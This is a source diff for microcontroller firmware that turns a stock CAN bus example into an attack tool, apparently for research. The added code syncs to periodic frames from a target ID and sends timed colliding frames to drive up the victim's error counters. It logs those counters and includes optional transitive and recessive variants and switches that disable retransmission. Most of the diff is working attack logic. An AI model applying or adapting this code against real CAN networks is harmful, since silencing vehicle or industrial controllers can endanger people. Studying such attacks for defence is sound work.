@@ -59,23 +59,53 @@ volatile uint32_t g_ui32TXMidMsgCount = 0;
 volatile uint32_t g_ui32TXCount = 0;
 volatile uint32_t g_ui32RXCount = 0;
 
+volatile uint32_t g_target_id = 0;
+
 //*****************************************************************************
 //
 // A flag for the interrupt handler to indicate that a message was received.
 //
 //*****************************************************************************
 volatile bool g_bRXFlag = 0;
+volatile bool g_bTXFlag = 0;
 
 volatile bool g_tick = false;
-
-#define SYNC_0PHASE
-//#define SYNC_PERIOD
 
 volatile uint8_t g_sync = 0;
 volatile uint8_t g_reset = 0;
 
 volatile uint8_t g_msg_since_idle = 0;
 volatile uint8_t g_sync_since_idle = 255;
+
+
+/* experimental controls */
+
+#define VERBOSE
+
+//#define SEND_EXTRA 2
+
+
+
+#define ATTACK
+
+//#define TRANSITIVE_ATTACK
+
+// TODO
+// set SKIP_ATTACK to 2 for 1 skip, 3 to skip 2, etc.
+#define SKIP_ATTACK 2
+volatile uint8_t g_skip_attack = SKIP_ATTACK;
+
+//#define RECESSIVE_ATTACK
+
+/* Synchronization control */
+#define SYNC_0PHASE
+//#define SYNC_PERIOD
+
+/* Retransmission control */
+//#define DISABLE_AUTO
+//#define DISABLE_ABORT_TX_ERROR
+#define DISABLE_ABORT_RX_PRECEDED
+
 
 
 //*****************************************************************************
@@ -93,9 +123,18 @@ volatile uint32_t g_ui32ErrFlag = 0;
 //
 //*****************************************************************************
 tCANMsgObject g_sCAN0RxMessage;
-tCANMsgObject g_sCAN0TxMessage_5;
-tCANMsgObject g_sCAN0TxMessage_10;
 
+tCANMsgObject g_sCAN0TxMessage_5;
+#if defined(SEND_EXTRA)
+tCANMsgObject g_sCAN0TxMessage_5C1;
+tCANMsgObject g_sCAN0TxMessage_5C2;
+#endif
+#if defined(TRANSITIVE_ATTACK)
+tCANMsgObject g_sCAN0TxMessage_5A1;
+tCANMsgObject g_sCAN0TxMessage_5A2;
+#endif
+tCANMsgObject g_sCAN0TxMessage_10;
+tCANMsgObject g_sCAN0TxMessage_1000;
 
 //*****************************************************************************
 //
@@ -104,10 +143,19 @@ tCANMsgObject g_sCAN0TxMessage_10;
 //*****************************************************************************
 
 #define RXOBJECT             10
-#define TXOBJECT_5           2
-#define TXOBJECT_10          4
+#define RXOBJECT2             9
+
+#define TXOBJECT_5A1    1
+#define TXOBJECT_5A2    2
+#define TXOBJECT_5           3
+#define TXOBJECT_5C1    4
+#define TXOBJECT_5C2    5
+
+#define TXOBJECT_10          7
+#define TXOBJECT_1000        8
 
 #define TARGET_ID (0x11)
+#define PRECEDED_ID (0x09)
 
 //---------
 
@@ -115,7 +163,9 @@ tCANMsgObject g_sCAN0TxMessage_10;
 
 #define INTERVAL (600000) /* 5 ms */
 
-#define DIFFERENCE ((44*120000)/(BITRATE/1000)) /* approximately 1 0-byte message transmission time */
+#define DIFFERENCE ((44*120000)/(BITRATE/1000)) // ((44*120000)/(BITRATE/1000)) /* approximately 1 0-byte message transmission time */
+
+#define LATENCY ((64*120000)/(BITRATE/1000))
 
 #define LATENCY_8B_MAX ((129*120000)/(BITRATE/1000)) /* maximum message latency */
 
@@ -125,8 +175,25 @@ tCANMsgObject g_sCAN0TxMessage_10;
 //
 //*****************************************************************************
 
+#if defined(RECESSIVE_ATTACK)
+uint8_t g_ui8TXMsgData_5[8] = { 0xC0, 0x70, 0x60, 0x50, 0x40, 0x30, 0x20, 0x10 };
+#else
 uint8_t g_ui8TXMsgData_5[7] = { 0x80, 0x70, 0x60, 0x50, 0x40, 0x30, 0x20 };
+#endif
+
 uint8_t g_ui8TXMsgData_10[8] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };
+
+#if defined(SEND_EXTRA)
+uint8_t g_ui8TXMsgData_5C1[8] = { 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80 };
+uint8_t g_ui8TXMsgData_5C2[8] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };
+#endif
+
+#if defined(TRANSITIVE_ATTACK)
+uint8_t g_ui8TXMsgData_5A1[8] = { 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80 };
+uint8_t g_ui8TXMsgData_5A2[8] = { 0x81, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };
+#endif
+
+uint8_t g_ui8TXMsgData_1000[1] = { 0xFF };
 
 int8_t g_ui8RXMsgData[8];
 
@@ -175,6 +242,19 @@ CAN0IntHandler(void)
         //
         ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
 
+#if defined(DISABLE_ABORT_TX_ERROR)
+        uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
+        if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
+            if (g_target_id == TARGET_ID ) {
+                CANMessageClear(CAN0_BASE, TXOBJECT_5);
+            } else {
+#if defined(TRANSITIVE_ATTACK)
+                CANMessageClear(CAN0_BASE, TXOBJECT_5A2);
+#endif
+            }
+        }
+#endif
+
         //
         // Add ERROR flags to list of current errors. To be handled
         // later, because it would take too much time here in the
@@ -183,62 +263,69 @@ CAN0IntHandler(void)
         g_ui32ErrFlag |= ui32Status;
     }
 
-    //
-    // Check if the cause is message object RXOBJECT, which we are using
-    // for receiving messages.
-    //
-    else if(ui32Status == RXOBJECT)
-    {
-        CANIntClear(CAN0_BASE, RXOBJECT);
+    else {
 
-        g_bRXFlag = true;
+        if(ui32Status == RXOBJECT) {
+            CANIntClear(CAN0_BASE, RXOBJECT);
+            g_bRXFlag = true;
+            g_ui32ErrFlag = 0;
+        }
+
+        else if(ui32Status == RXOBJECT2) {
+            CANIntClear(CAN0_BASE, RXOBJECT2);
+            g_bRXFlag = true;
+        }
+
+        else if(ui32Status == TXOBJECT_5)
+        {
+            CANIntClear(CAN0_BASE, TXOBJECT_5);
+            g_ui32TXMsgCount++;
+            g_bTXFlag = true;
+            g_ui32ErrFlag = 0;
+        }
+        else if (ui32Status == TXOBJECT_5C1) {
+                CANIntClear(CAN0_BASE, TXOBJECT_5C1);
+                g_ui32ErrFlag = 0;
+            }
+            else if (ui32Status == TXOBJECT_5C2) {
+                CANIntClear(CAN0_BASE, TXOBJECT_5C2);
+                g_ui32ErrFlag = 0;
+            }
+#if defined(TRANSITIVE_ATTACK)
+        else if (ui32Status == TXOBJECT_5A1) {
+            CANIntClear(CAN0_BASE, TXOBJECT_5A1);
+            g_bTXFlag = true;
+            g_ui32ErrFlag = 0;
+        }
+        else if (ui32Status == TXOBJECT_5A2) {
+            CANIntClear(CAN0_BASE, TXOBJECT_5A2);
+            g_bTXFlag = true;
+            g_ui32ErrFlag = 0;
+        }
+#endif
+        else if (ui32Status == TXOBJECT_10) {
+            CANIntClear(CAN0_BASE, TXOBJECT_10);
+            g_ui32ErrFlag = 0;
+        }
+        else if (ui32Status == TXOBJECT_1000) {
+            CANIntClear(CAN0_BASE, TXOBJECT_1000);
+            g_ui32ErrFlag = 0;
+        }
+        else {
+               CANIntClear(CAN0_BASE, ui32Status);
+               g_ui32ErrFlag = 0;
+        }
 
 #if defined(SYNC_0PHASE)
             timer_val = TimerLoadGet(TIMER1_BASE, TIMER_A);
-            TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
-            if (timer_val == 0) {
-                ROM_TimerEnable(TIMER1_BASE, TIMER_A);
+            TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY);
+            ROM_TimerEnable(TIMER1_BASE, TIMER_A);
+            if (timer_val < 10) {
                 g_msg_since_idle = 0;
             } else {
                 g_msg_since_idle++;
             }
 #endif
-
-        g_ui32ErrFlag = 0;
-    }
-
-    else if(ui32Status == TXOBJECT_5)
-    {
-        //
-        // Getting to this point means that the TX interrupt occurred on
-        // message object TXOBJECT, and the message reception is complete.
-        // Clear the message object interrupt.
-        //
-        CANIntClear(CAN0_BASE, TXOBJECT_5);
-
-        //
-        // Increment a counter to keep track of how many messages have been
-        // transmitted. In a real application this could be used to set
-        // flags to indicate when a message is transmitted.
-        //
-        g_ui32TXMsgCount++;
-
-        //
-        // Since a message was transmitted, clear any error flags.
-        // This is done because before the message is transmitted it triggers
-        // a Status Interrupt for TX complete. by clearing the flag here we
-        // prevent unnecessary error handling from happeneing
-        //
-        g_ui32ErrFlag = 0;
-    }
-    else if (ui32Status == TXOBJECT_10) {
-            CANIntClear(CAN0_BASE, TXOBJECT_10);
-            g_ui32ErrFlag = 0;
-    }
-    else
-    {
-        CANIntClear(CAN0_BASE, ui32Status);
-        g_ui32ErrFlag = 0;
     }
     ROM_IntMasterEnable();
 }
@@ -273,21 +360,32 @@ __error__(char *pcFilename, uint32_t ui32Line)
 void
 send_messages(uint32_t count)
 {
-    uint32_t rec, tec;
-
-    if (g_sync == 1 && g_reset == 0) {
-        /* do it */
-        CANMessageSet(CAN0_BASE, TXOBJECT_5, &g_sCAN0TxMessage_5,
-                  MSG_OBJ_TYPE_TX);
-
-        CANErrCntrGet(CAN0_BASE, &rec, &tec);
-        UARTprintf("%d\tREC\t%u\tTEC\t%u\n", count, rec, tec);
-    }
-
-#if 0
+    static uint16_t skip_cnt = 0;
     if ( count % 2 == 0 ) {
-        CANMessageSet(CAN0_BASE, TXOBJECT_10, &g_sCAN0TxMessage_10,
-                  MSG_OBJ_TYPE_TX);
+#if defined(ATTACK)
+        if ( g_sync == 1 && g_reset == 0 ) {
+            if ( skip_cnt % g_skip_attack == 0 ) {
+               if ( g_target_id == TARGET_ID ) {
+                    CANMessageSet(CAN0_BASE, TXOBJECT_5, &g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
+                } else {
+#if defined(TRANSITIVE_ATTACK)
+                    CANMessageSet(CAN0_BASE, TXOBJECT_5A2, &g_sCAN0TxMessage_5A2, MSG_OBJ_TYPE_TX);
+#endif
+                }
+            }
+            if ( g_target_id != TARGET_ID ) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_5, &g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
+            }
+            ++skip_cnt;
+        } else {
+            skip_cnt = 0;
+        }
+#endif
+    }
+#if defined(SEND_EXTRA)
+    else {
+        CANMessageSet(CAN0_BASE, TXOBJECT_5C1, &g_sCAN0TxMessage_5C1, MSG_OBJ_TYPE_TX);
+        CANMessageSet(CAN0_BASE, TXOBJECT_5C2, &g_sCAN0TxMessage_5C2, MSG_OBJ_TYPE_TX);
     }
 #endif
 
@@ -312,12 +410,7 @@ Timer0IntHandler(void)
 #if defined(SYNC_0PHASE) || defined(SYNC_PERIOD)
     if (g_sync == 2) {
         TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
-
-        //if (g_sync_since_idle < 4) {
-            g_sync = 1;
-        //} else {
-        //    g_sync = 0;
-        //}
+        g_sync = 1;
     }
 #endif
 
@@ -336,6 +429,11 @@ Timer1IntHandler(void)
 void ResetCAN0(void)
 {
     CANInit(CAN0_BASE);
+
+#if defined(DISABLE_AUTO)
+        CANRetrySet(CAN0_BASE, false);
+#endif
+
     CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);
     CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);
     IntEnable(INT_CAN0);
@@ -376,6 +474,10 @@ InitCAN0(void)
     // Initialize the CAN controller
     //
     CANInit(CAN0_BASE);
+
+#if defined(DISABLE_AUTO)
+        CANRetrySet(CAN0_BASE, false);
+#endif
 
     //
     // Set up the bit rate for the CAN bus.  This function sets up the CAN
@@ -418,7 +520,6 @@ InitCAN0(void)
     g_sCAN0RxMessage.ui32MsgIDMask = 0;
     g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
     g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);
-
     CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);
 
     /* TX Objects */
@@ -426,9 +527,37 @@ InitCAN0(void)
 
     g_sCAN0TxMessage_5.ui32MsgID = 0x11;
     g_sCAN0TxMessage_5.ui32MsgIDMask = 0;
-    g_sCAN0TxMessage_5.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_5.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
     g_sCAN0TxMessage_5.ui32MsgLen = sizeof(g_ui8TXMsgData_5);
     g_sCAN0TxMessage_5.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5;
+
+#if defined(SEND_EXTRA)
+    g_sCAN0TxMessage_5C1.ui32MsgID = 0x33;
+    g_sCAN0TxMessage_5C1.ui32MsgIDMask = 0;
+    g_sCAN0TxMessage_5C1.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_5C1.ui32MsgLen = sizeof(g_ui8TXMsgData_5C1);
+    g_sCAN0TxMessage_5C1.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5C1;
+
+    g_sCAN0TxMessage_5C2.ui32MsgID = 0x44;
+    g_sCAN0TxMessage_5C2.ui32MsgIDMask = 0;
+    g_sCAN0TxMessage_5C2.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_5C2.ui32MsgLen = sizeof(g_ui8TXMsgData_5C2);
+    g_sCAN0TxMessage_5C2.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5C2;
+#endif
+
+#if defined(TRANSITIVE_ATTACK)
+    g_sCAN0TxMessage_5A1.ui32MsgID = 0x07;
+    g_sCAN0TxMessage_5A1.ui32MsgIDMask = 0;
+    g_sCAN0TxMessage_5A1.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_5A1.ui32MsgLen = sizeof(g_ui8TXMsgData_5A1);
+    g_sCAN0TxMessage_5A1.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5A1;
+
+    g_sCAN0TxMessage_5A2.ui32MsgID = 0x09;
+    g_sCAN0TxMessage_5A2.ui32MsgIDMask = 0;
+    g_sCAN0TxMessage_5A2.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_5A2.ui32MsgLen = sizeof(g_ui8TXMsgData_5A2);
+    g_sCAN0TxMessage_5A2.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5A2;
+#endif
 
 #if 0
     g_sCAN0TxMessage_10.ui32MsgID = 0x09;
@@ -445,13 +574,11 @@ InitCAN0(void)
     g_sCAN0TxMessage_100.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_100;
 #endif
 
-#if 0
-    g_sCAN0TxMessage_1000.ui32MsgID = 0xD3;
+    g_sCAN0TxMessage_1000.ui32MsgID = 0xFF;
     g_sCAN0TxMessage_1000.ui32MsgIDMask = 0;
-    g_sCAN0TxMessage_1000.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
+    g_sCAN0TxMessage_1000.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
     g_sCAN0TxMessage_1000.ui32MsgLen = sizeof(g_ui8TXMsgData_1000);
     g_sCAN0TxMessage_1000.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_1000;
-#endif
 }
 
 //*****************************************************************************
@@ -711,6 +838,8 @@ int
 main(void)
 {
     int count;
+    uint32_t rec, tec;
+
     //
     // Enable lazy stacking for interrupt handlers.  This allows floating-point
     // instructions to be used within interrupt handlers, but at the expense of
@@ -727,7 +856,6 @@ main(void)
                                              SYSCTL_CFG_VCO_480), 120000000);
 
 
-    // TODO: Refactor below: InitLEDs()
     //
     // Enable the GPIO port that is used for the on-board LEDs.
     //
@@ -774,6 +902,7 @@ main(void)
         ROM_TimerEnable(TIMER1_BASE, TIMER_A);
 #endif
 
+    g_target_id = TARGET_ID;
 
     //
     // Loop forever while the timers run.
@@ -783,9 +912,20 @@ main(void)
         if( g_tick == true ) {
             g_tick = false;
 
-            count = g_ui32TXCount++;
+            send_messages(++count);
+        }
 
-            send_messages(count);
+        if (g_bTXFlag) {
+
+            CANErrCntrGet(CAN0_BASE, &rec, &tec);
+            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+            g_bTXFlag = false;
+
+#if defined(TRANSITIVE_ATTACK)
+            g_target_id = 0x09;
+            g_sync = 4;
+            g_skip_attack = 2;
+#endif
         }
 
         //
@@ -810,6 +950,7 @@ main(void)
             //
             CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);
 
+
             //
             // Clear the pending message flag so that the interrupt handler can
             // set it again when the next message arrives.
@@ -825,14 +966,24 @@ main(void)
             //    UARTprintf("\nCAN message loss detected\n");
             }
 
-            if (g_sCAN0RxMessage.ui32MsgID == TARGET_ID && g_sCAN0RxMessage.ui32MsgLen == 8) {
+#if defined(DISABLE_ABORT_RX_PRECEDED)
+            if (g_sCAN0RxMessage.ui32MsgID == PRECEDED_ID ) {
+                volatile int delay = 0;
+                for (delay = 0; delay < 1000; delay++); /* FIXME: Fudge factor. */
+                CANMessageClear(CAN0_BASE, TXOBJECT_5);
+            }
+#endif
+
+            if (g_sCAN0RxMessage.ui32MsgID == g_target_id) {
 #if defined(SYNC_0PHASE)
                 if (g_sync != 1) {
                     if (g_sync > 3) g_sync--;
-                    else if (g_msg_since_idle < g_sync_since_idle) {
-                        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
-                        g_sync_since_idle = g_msg_since_idle;
-                        g_sync = 2;
+                    //else if ( g_msg_since_idle < g_sync_since_idle ) {
+                        else if ( g_msg_since_idle < 4 ) {
+                            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
+                            //g_sync_since_idle = 1;
+                            count = 0;
+                            g_sync = 2;
                     }
                 }
 #elif defined(SYNC_PERIOD)
@@ -840,16 +991,26 @@ main(void)
                     if (g_sync > 3) g_sync--;
                     else {
                         TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE-LATENCY_8B_MAX); /* re-synch */
+                        count = 0;
                         g_sync = 2;
                     }
                 }
 #endif /* SYNC */
+
+#if defined(VERBOSE)
+                CANErrCntrGet(CAN0_BASE, &rec, &tec);
+                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+
             } else if (g_sCAN0RxMessage.ui32MsgID == 0xff) {
                 UARTprintf("%d\tRESET\n", count);
                 g_sync = 4;
                 g_sync_since_idle = 255;
                 g_msg_since_idle = 0;
                 g_reset = 0;
+                count = 0;
+                g_target_id = TARGET_ID;
+                g_skip_attack = SKIP_ATTACK;
                 ResetCAN0();
                 TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
                 ROM_TimerEnable(TIMER1_BASE, TIMER_A);
